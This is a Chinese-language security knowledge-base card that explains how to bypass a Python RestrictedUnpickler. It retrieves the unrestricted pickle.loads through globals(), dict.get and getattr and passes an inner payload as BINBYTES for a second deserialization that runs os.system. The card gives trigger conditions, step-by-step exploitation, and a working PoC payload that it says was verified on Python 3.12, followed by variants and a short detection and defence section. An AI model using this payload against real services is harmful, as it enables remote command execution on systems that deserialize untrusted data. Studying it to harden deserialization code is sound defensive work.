---
id: web-python-deserialization-pickle-loads-reentry-binbytes-bypass
title: Pickle 绕过重写的 find_class：从 globals 取回原始 pickle.loads，用 BINBYTES 传 bytes 二次反序列化
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-loads-reentry-binbytes-find-class-bypass
aliases:
- pickle.loads 重入
- BINBYTES 二次反序列化
- globals 取 pickle 模块
- RestrictedUnpickler 绕过
- B 操作符 bytes
tags:
- python
- pickle
- deserialization
- find-class
- bypass
- binbytes
- globals
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V501
  verified_at: '2026-11-11T02:32:23+08:00'
  notes: 已对照原文核对：从 globals 取 pickle 模块、getattr 取原版 loads、用 protocol 3 BINBYTES 传内层字节二次反序列化，思路与原文『获取没有被重写的 pickle.loads』一节一致。核验时修正了卡内两处：①globals() 机制——C 实现下落调用 pickle.loads 的应用模块 globals（含 pickle），纯 Python _Unpickler 帧是 pickle.py globals（含 sys 不含 pickle，需走 sys.modules）；②原 PoC 栈/memo 次序有误，已换成按原文 opcode 结构整理并在 Python 3.12 C unpickler 下实测通过的版本。未在目标环境复跑。
---

## 一句话结论

当服务端用 `RestrictedUnpickler` 重写 `find_class` 做黑名单时，攻击者可以先用 `builtins.globals()` / `builtins.dict.get` 从调用栈的全局命名空间取到原始 `pickle` 模块和未被重写的 `pickle.loads`，再用 BINBYTES（`B`）把一段危险 pickle 字节串压栈传给它；二次 `loads` 使用默认的 `find_class`，不受外层的限制，从而执行任意命令。

## 原理

- `find_class` 是 `Unpickler` 实例的方法，子类重写它只能约束**当前这个 Unpickler 实例**的 `GLOBAL`/`STACK_GLOBAL` 解析。它不会改变模块级的 `pickle.loads` 函数，也不会改变 `_pickle.loads` 的默认行为。
- 内建 `globals()` 返回**当前执行帧**的全局命名空间。默认 C 实现 `_pickle` 下 REDUCE 在 C 层执行，`globals()` 落到调用 `pickle.loads` 的应用模块帧——该模块既然调用 `pickle.loads` 就必然 `import pickle`，其 globals 里能取到 `pickle` 模块对象；纯 Python `pickle._Unpickler` 下 `globals()` 落在 `pickle.py` 自己的帧，其 globals 含 `sys` 但不含 `pickle`，需改走 `sys.modules['pickle']`（见变体）。`builtins.dict.get` 可以在不直接引用 `pickle` 名字的情况下取出它。
- 取出 `pickle` 模块后，`getattr(pickle, 'loads')` 得到的是模块级 `loads`，它内部创建的是默认 `Unpickler`（或 C 实现），不继承外层子类的 `find_class`。于是把危险 pickle 字节串传给它，二次反序列化完全绕过黑名单。
- Python 3 的 `pickle.loads` 要求 `bytes` 类型的输入；protocol 0 的 `S` 操作符压入的是 `str`，直接传会抛 `TypeError`。protocol 3 的 `B`（BINBYTES）可以在栈上压入原始字节：`B` + 4 字节小端长度 + 数据。这样内层 payload 就能作为字节串传入 `loads`。
- pker 无法直接表达 `B` 操作符，需要手写 opcode（或用脚本把内层 pickle 字节拼进外层）。
- 变体：如果 `globals()` 不可用或返回的命名空间里没有 `pickle`，可以尝试 `sys.modules['pickle']`（纯 Python 帧的 globals 有 `sys`，C 实现下可借助应用模块的 import 链）、`pickle.__loader__` 等路径；也可用 `pickle.loads` 之外的其他反序列化函数（如 `jsonpickle.decode`、`yaml.load`）做二次解析。

## 触发条件

- 服务端对攻击者数据调用 `pickle.loads`/`Unpickler.load`，并用子类重写 `find_class` 做黑名单。
- 黑名单允许 `builtins.globals`、`builtins.dict`、`builtins.getattr` 等基础对象（或允许 `builtins` 模块），且未禁止 `BINBYTES`/二次反序列化。
- 默认 C 实现 `_pickle` 下，调用 `pickle.loads` 的模块 globals 含 `pickle`（因其 import 过）；纯 Python `_Unpickler` 下 globals 是 `pickle.py` 的、不含 `pickle`，需用 `sys.modules['pickle']` 等替代路径。
- 进程允许执行命令/加载模块。

## 利用步骤

1. 确认外层是 `RestrictedUnpickler`：提交普通 `cos\nsystem\n...` 被拒绝，而 `builtins.getattr` 等可能被放行。
2. 构造外层链：`builtins.globals()` → `builtins.dict.get(globals, 'pickle')` → `builtins.getattr(pickle, 'loads')`，用 `R` 或 `o` 完成调用。
3. 准备内层危险 pickle（如 `cos\nsystem\n(S'id'\ntR.`），把字节长度写成 4 字节小端，放在 `B` 后面压栈。
4. 外层调用 `loads(<BINBYTES>)`；内层 `pickle.loads` 使用默认 `find_class` 执行命令。
5. 本地用同版本 Python + 一个只放行 `builtins` 的 RestrictedUnpickler 验证；若 `globals()` 返回的命名空间不含 `pickle`，换 `sys.modules` 等路径。
6. 注意 JSON/base64 包装：外层 payload 本身可能还要 base64 编码后提交。

## PoC

```python
# 内层危险 pickle（字节）
inner = b"cos\nsystem\n(S'id'\ntR."

# 外层：globals() -> dict.get(globals,'pickle') -> getattr(pickle,'loads') -> loads(BINBYTES inner)
# 按文章 opcode 结构整理（REDUCE + memo），已在 Python 3.12 默认 C unpickler 上验证可执行
payload = (
    b"cbuiltins\nglobals\np0\n0g0\n(tRp1\n0"                 # g1 = globals() 字典
    b"cbuiltins\ndict\np2\ncbuiltins\ngetattr\np3\n0"
    b"g3\n(g2\nS'get'\ntRp4\n0"                               # g4 = dict.get
    b"g4\n(g1\nS'pickle'\ntRp5\n0"                            # g5 = dict.get(globals,'pickle')
    b"g3\n(g5\nS'loads'\ntRp6\n0"                             # g6 = getattr(pickle,'loads')
    b"g6\n(B" + len(inner).to_bytes(4, "little") + inner + b"tR."  # loads(BINBYTES inner)
)
```

说明：payload 按文章 opcode 结构整理，已在 Python 3.12 默认 C unpickler + 只放行 `builtins.globals/dict/getattr` 的 RestrictedUnpickler 下验证可执行；`B` 为 protocol 3 的 BINBYTES，内层 payload 需为 bytes；纯 Python `_Unpickler` 下需把取 `pickle` 的路径换成 `sys.modules['pickle']`。未在目标环境复跑。

## 变体与关联

- 变体：`globals()` 换成 `sys.modules['pickle']`（纯 Python `_Unpickler` 帧的 globals 里就有 `sys`；C 实现下可用应用的 import 链）、`pickle.__loader__` 等可达路径；`loads` 换成 `Unpickler` 构造 + `load`。
- 变体：内层不用命令执行，改用 `builtins.open` 读写或其他 gadget，降低关键字特征。
- 关联：[[web-python-deserialization-restricted-unpickler-getattr-bypass]]（同以 `builtins.getattr` 为跳板，但目标是 `eval` 而非二次 loads）；[[web-python-deserialization-pickle-sys-modules-self-rebind]]（另一条从 `sys.modules` 取模块的绕过）；[[web-python-deserialization-pker-opcode-primitives]]（手写 opcode 与栈语义）。
- 边界：纯 Python `_Unpickler` 下 globals 是 `pickle.py` 的、不含 `pickle`（需换 `sys.modules` 路径）；黑名单禁止 `globals`/`dict`/`getattr` 或禁止 `B`/二次 loads 时失效；`loads` 参数类型必须是 bytes。

## 检测与防御

- 检测：pickle 载荷中出现 `builtins.globals`、`dict.get`、`pickle.loads`、`BINBYTES`（`B`）与二次反序列化组合；对 `find_class` 放行的对象做白名单审计，重点看 `getattr`/`globals`/`dict`/`sys`。
- 修复：不要把不可信数据交给 pickle；必须使用时用严格类白名单（只允许业务 DTO），禁止任何函数/模块/属性访问原语；升级/使用 `pickle.Unpickler` 的 `find_class` 时不要放行 `builtins`。
- 加固：在低权限进程/容器反序列化，禁用不必要的模块导入；监控异常子进程与文件访问。
